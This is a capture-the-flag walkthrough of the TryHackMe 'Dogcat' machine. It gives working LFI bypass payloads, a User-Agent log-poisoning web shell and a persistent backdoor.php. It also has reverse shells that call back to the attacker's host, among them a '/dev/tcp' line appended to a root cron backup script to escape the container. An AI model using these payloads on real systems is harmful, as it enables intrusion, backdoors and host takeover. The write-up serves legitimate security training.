<center><strong><font color="DarkGray"><a href="https://tryhackme.com/room/dogcat" target="_blank"><er>Dogcat</er></a> is a vulnerable machine which focuses primarily on web exploitation, specifically the exploitation of an LFI vulnerability with the implementation of various bypassing techniques. To gain an initial foothold, a Log Poisoning attack can be utilized to achieve remote code execution on the server. After gaining access, several indications suggest that we are within a Docker container, where a misconfigured SUDO can be exploited to become a root user, but only within the container. To escape from the container, a vulnerable backup bash script that runs every minute, can be exploited to gain root access on the host.</font></strong></center>

### **<strong><font color="DarkCyan">Service Enumeration</font></strong>**
#### **<strong><font color="MediumPurple">Enumerating dogcat.thm</font></strong>**

Let's assign a domain name, such as ```dogcat.thm``` to the target machine IP and add it to ```/etc/hosts```, in order to simplify the enumeration process.
```bash
$ echo '10.10.3.151 dogcat.thm' >> /etc/hosts
```
Navigating to [http://dogcat.thm](https://dogcat.thm), you will be presented with the following page, where you have two options to choose from: ```dog``` and ```cat``` <br/>

<center><i>http://dogcat.thm</i></center>
<br/>
Clicking on one of the options (for example ```A dog```) leads to [http://dogcat.thm/?view=dog](https://dogcat.thm/?view=dog) <br/>

## **<strong><font color="Brown">Exploitation</font></strong>**
***
### **<strong><font color="DarkCyan">Local File Inclusion</font></strong>**
#### **<strong><font color="MediumPurple">Testing Directory Traversal:</font></strong>**
The first thing that comes to mind when you see this kind of URL scheme is to look for a ```directory traversal``` vulnerability. Trying to read the classic ```/etc/passwd``` via directory traversal does not lead anywhere. In fact, there is some kind of filter in the back-end, which filters any value that does not have the word ```'cat'``` or ```'dog'```. In other words, as long as the value included in the ```view``` parameter does not contain ```'cat'``` or ```'dog'```, the backend php script will always return the error message: ```Sorry, only dogs or cats are allowed.``` <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-26 08_16_49-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>"Sorry, only dogs or cats are allowed." Error message</i></center>
<br/>

If we were to inject a payload such as ```../../../etc/passwd%00cat```, it would cause the backend php script to return an unhandled error message like the one below: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-26 08_24_23-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Triggering an error message</i></center>
<br/>

Another important thing to mention is that the backend PHP script append the extension  ```.php``` to any value injected in the ```view``` parameter. For example, if we were to inject ```cat.php```, we would get the following error message: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-26 08_28_49-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Appended .php extension</i></center>

Based on this analysis, I would assume that the backend PHP script might look to something like the following:

```php
$file = $_GET['view'];
// Input validation
if(!preg_match("/\b(cat|dog)\b/i", $file)){
    echo "Sorry, only dogs or cats are allowed.";
    exit;
} else {
     $file = $file . '.php'; // Append '.php' to the $file variable
    include($file);
}
```
* This PHP script takes in a user input ```view``` from the URL query string using ```$_GET``` and then validate the input using ```preg_match()``` to ensure it contains the string ```cat``` or ```dog```. If the input does not contain either of these strings, it will output the error message ```"Sorry, only dogs or cats are allowed."``` and exit the script. Otherwise, the code will append the extension ```.php``` to the $file variable and then include the file specified by the user using  ```include()```.

#### **<strong><font color="MediumPurple">Reading index.php source code:</font></strong>**
One way to get the source code ```index.php``` is using ```convert.base64-encode``` [filter](https://www.php.net/manual/en/filters.convert.php) with the PHP wrapper ```php://filter```, which fetches the content of the script and then prints out the base64 version of it. Unfortunately, we cannot simply inject the ```view``` parameter with something like:

```console
php://filter/convert.base64-encode/resource=/var/www/html/index.php
```

because our payload does not have the strings ```dog``` or ```cat``` as a substring. Hence the error message: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-26 10_33_55-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Testing php://filter payload</i></center>
<br/>

In order to bypass this check, we can inject the following payload, which does contain the string ```'cat'```, hence bypasses the check.

```console
php://filter/convert.base64-encode/resource=/var/www/html/cat.php../../../../../var/www/html/index
```
In the backend, the ```include``` statement would attempt to include the file located at the path  ```/var/www/html/cat.php../../../../var/www/html/index.php```, and since ```../``` in a file path is used to move up one directory level, ```../../../../``` means the ```include``` statement would attempt to go up 4 levels from ```/var/www/html/cat.php```, which will lead to the root  ```/``` directory and eventually including the source ```/var/www/html/index``` + the appended extension ```.php``` <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-26 10_37_07-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Burpsuite (Repeater)</i></center>
<br/>
* Let's base64 decode the response:

```bash
$ echo -n <response> | base64 --decode
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-26 11_03_13-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">

* Well, it appears that our guessing attempt was not quite accurate 😅

In this PHP script, the check is made by the ```containsStr()``` function, which takes in two arguments - a string, represented by the value passed to the `view` parameter, and a substring ('cat' or 'dog'), and returns ```true``` if the substring is found in the string and ```false``` otherwise.
There is also an optional `ext` parameter, which has a default value of ```.php```, and is appended to the value passed to the `view` parameter.

#### **<strong><font color="MediumPurple">Reading /etc/passwd:</font></strong>**
To retrieve the content of ```/etc/passwd``` file, we can use the ```php://filter``` wrapper, just like we did to retrieve the source code, using the following payload:

```console
php://filter/convert.base64-encode/resource=/var/www/html/cat.php../../../../etc/passwd&ext=
```

* 📍 Take note of the `ext` parameter, which has no assigned value. This is done intentionally to prevent the default `.php` extension from being added to the `/etc/passwd` string.

> ⚠️ It should be noted that due to the PHP version being used (`php7.4.3` > `php5.3`), the conventional technique of using `%00` to bypass the appended extension cannot be employed in this scenario.

Alternatively, we can use the below payload to retrieve the content in plain text and avoid the hassle of having to base64 decode the response.

```console
/?view=/var/www/html/cat.php../../../../../etc/passwd&ext=
```

<center><i>/etc/passwd</i></center>
<br/>

#### **<strong><font color="MediumPurple">Automating the exploitation:</font></strong>**
To simplify the process, I have written a [Python script](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/blob/main/THM/dogcat/lfi.py) that automates the exploitation of this LFI vulnerability. By providing the full file path of the desired file, the script will handle the entire retrieval process. <br/>

**🎯 Execution:**

### **<strong><font color="DarkCyan">Web shell via Log Poisoning</font></strong>**
#### **<strong><font color="MediumPurple">Log Poisoning:</font></strong>**
Log poisoning involves injecting PHP code into log files so that when they are loaded and executed, the PHP code is executed as well. For instance, the access log file ```/var/log/apache2/acces.log``` records each visit to the site with the URL visited and the user-agent string of the browser. One simple way to perform log poisoning is by modifying the ```User-Agent``` header to include PHP code and then including the log file with our ```LFI```.

#### **<strong><font color="MediumPurple">Reading /var/log/apache2/access.log:</font></strong>**
Let's retrieve the content of the access log file, using our [Python script](https://github.com/YounesTasra-R4z3rSw0rd/CTF-Scripts/blob/main/THM/dogcat/lfi.py)

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-27 15_31_44-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>/var/log/apache2/access.log</i></center>
<br/>

#### **<strong><font color="MediumPurple">POC:</font></strong>**
Now that we can read the access log file, let's try to modify the User-Agent string to include the following PHP code, which will output some information about the current PHP configuration

```php
<?php phpinfo(); ?>
```

To do so, we can send the request using ```curl``` with the ```-A``` option to set the ```User-Agent``` header:

```bash
$ curl -A '<?php phpinfo(); ?>' http://dogcat.thm
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-27 15_48_44-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<br/>

In the browser, let's get the content of `/var/log/apache2/access.log`, by visiting <a href="https://dogcat.thm/?view=/var/www/html/cat.php../../../../../var/log/apache2/access&ext=.log" target="_blank"><er>http://dogcat.thm/?view=/var/www/html/cat.php../../../../../var/log/apache2/access&ext=.log</er></a>

<center><i>phpinfo()</i></center>
<br/>

#### **<strong><font color="MediumPurple">Web shell:</font></strong>**
Using ```Burp```, Let's inject the ```User-Agent``` header, with the following:

```php
[Output]: <?php system($_GET['cmd']); ?>
```
> 📍 Adding a marker, such as ```"[output]"```, in your web shell is recommended to make it easier to locate your output in the log file as it grows. This way, you can quickly find your output with `Ctrl+F` even as the log file becomes larger.

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-27 16_46_27-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-27 17_00_43-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">

<br/>

##### **<strong><font color="SteelBlue">Backdooring the web shell:</font></strong>**
To upgrade our basic web shell, we can stage a backdoor, which is essentially a PHP script that will contain the below PHP code, and then we can use this backdoor to get remote code execution on the webserver.

```php
<?php echo '[Output]: '; system($_GET['cmd']); ?>
```

To do so, we can use our web shell to execute the following command:
```bash
echo '<?php echo "[output]: ";system($_GET["cmd"]); ?>' > backdoor.php
```
<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-27 20_30_26-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">

Then, we can execute arbitrary commands on the server via our backdoor, by accessing the URL [http://dogcat.thm/backdoor.php?cmd=whoami](https://dogcat.thm/backdoor.php?cmd=whoami) <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-27 20_33_04-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">

* *Nice and Clean 👌*

## **<strong><font color="Brown">Initial Access</font></strong>**
### **<strong><font color="DarkCyan">Shell as www-data |Container|</font></strong>**
#### **<strong><font color="MediumPurple">via upload of php-reverse-shell.php:</font></strong>**

After having remote code execution on the server, one way to get a shell as `www-data` is by uploading [php-reverse-shell.php](https://pentestmonkey.net/tools/web-shells/php-reverse-shell) in the web root `/var/www/html` and then run it by accessing `http://dogcat.thm/php-reverse-shell.php`. The script will open an outbound TCP connection from the webserver to a host and port of your choice.
To do so, let's download the [PHP script](https://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz) and extract the content of the archive:
```bash
$ wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
$ tar xvf php-reverse-shell-1.0.tar.gz
```
Now cd into `php-reverse-shell-1.0` directory and then open `php-reverse-shell.php` file in a text editor. After opening the file, you need to change the values of the `$ip` and `$port` variables. To do this, replace the default values with your `tun0` IP address and a port number of your choosing, respectively, as shown below. <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-28 14_30_50-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Modifying $ip and $port</i></center>
<br/>

Now it's time to initiate a python webserver that will host the PHP script `php-reverse-shell.php` and upload it into the web root `/var/www/html`:
```bash
$ python3 -m http.server 80
$ curl 'http://dogcat.thm/backdoor.php?cmd=curl%20http://<Tun0_IP>/php-reverse-shell.php%20-o%20php-reverse-shell.php'
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-28 14_46_53-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Uploading php-reverse-shell.php file</i></center>
<br/>

Finally, start a TCP listener on the same port you specified in the script:

```bash
$ nc -nlvp 9999
```

And then run the script `php-reverse-shell.php` by simply browsing to [http://dogcat.php/php-reverse-shell.php](https://dogcat.php/php-reverse-shell.php)

```bash
$ curl 'http://dogcat.thm/php-reverse-shell.php'
```

If everything went well, you should have received a shell on your netcat listener: <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-28 14_59_54-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Reverse shell received</i></center>
<br/>

* Unfortunately, the server does not have `Python` installed, thus preventing us from transforming our shell into a more stable `PTY` shell.

#### **<strong><font color="MediumPurple">via Metasploit's web delivery:</font></strong>**
The other way to get a more stabilized shell is via **Metasploit's [Web Delivery Script](https://www.rapid7.com/db/modules/exploit/multi/script/web_delivery)**, which is used to generate payloads that can be delivered to a target system through a web page or any other way where we can have remote code execution.

First of all, let's launch the **Metasploit console** and use the **web delivery** module:

```bash
$ msfconsole -q
msf6 > use exploit/multi/script/web_delivery  
```

Next, we need to set the language for generating the payload that will be understood by the target, which is in our case, `php`:

```bash
msf6 exploit(multi/script/web_delivery) > set target 1
```

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-28 15_50_39-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>Web delivery Targets</i></center>
<br/>

Then, we set the `payload`,  `SRVHOST`, `SRVPORT`, `LHOST` and run the exploit:

```bash
msf6 exploit(multi/script/web_delivery) > set payload php/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set SRVHOST <tun0_IP>
msf6 exploit(multi/script/web_delivery) > set SRVPORT 80
msf6 exploit(multi/script/web_delivery) > set LHOST <tun0_IP>

#### **<strong><font color="MediumPurple">Method 1: Finding SUID executables:</font></strong>**
By using the following command, we can enumerate all binaries having SUID permissions:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

<br/>

##### **<strong><font color="SteelBlue">Exploitation:</font></strong>**
As you can see, the binary `/usr/bin/env` has the `suid` bit set, which means we can run any `env` as `www-data` (our current user), with `root` privileges.
Referring to [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid), shows that by just running the following command, we should get a root shell:
```bash
$ /usr/bin/env /bin/sh -p
```

<br/>

#### **<strong><font color="MediumPurple">Method 2: sudo -l:</font></strong>**
By running the following command, we can see what binaries and executables can our current user `www-data` run with root privileges:

```bash
$ sudo -l
```

<br/>

##### **<strong><font color="SteelBlue">Exploitation:</font></strong>**
As you can see, `www-data` can run `/usr/bin/env` as root, and according to [GTFOBins](https://gtfobins.github.io/gtfobins/env/#sudo), we can run the following command to get a root shell:
```bash
$ sudo /usr/bin/env /bin/sh
```

### **<strong><font color="DarkCyan">Shell as root (Host-dogcat)</font></strong>**
There are some indications that give away the fact that we are inside a docker container and not inside the actual machine:
* The hostname is a random string <br/>

<img src="https://raw.githubusercontent.com/YounesTasra-R4z3rSw0rd/YounesTasra-R4z3rSw0rd.github.io/main/assets/img/thm-dogcat/2023-04-28 18_43_32-HACKING_MACHINE - VMware Workstation 17 Player (Non-commercial use only).png" alt="">
<center><i>hostname</i></center>
<br/>

* There is a `.dockerenv` file in the system root `/` <br/>

<center><i>.dockerenv</i></center>
<br/>

* Common binaries like `ifconfig`, `ip`, `python3` are missing.

With that said, we need to break out of this docker container.

There is a backup script in `/opt/backups` which creates a tar archive file names `backup.tar` in the directory `/root/container/backup` that contains all the files and directories in the directory `/root/container`
```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```
Additionally, this backup script is executed every minute, as the timestamp of the backup.tar file is modified every minute: <br/>

<br/>

Since we have write access on this backup script, we can insert backdoor that activates a reverse shell script and gain root-level access to the host machine running the container.

```bash
$ echo 'bash -i >& /dev/tcp/<tun0_IP>/<PORT> 0>&1' >> backup.sh
```

After 1 minute, you should receive a shell on your netcat listener: <br/>
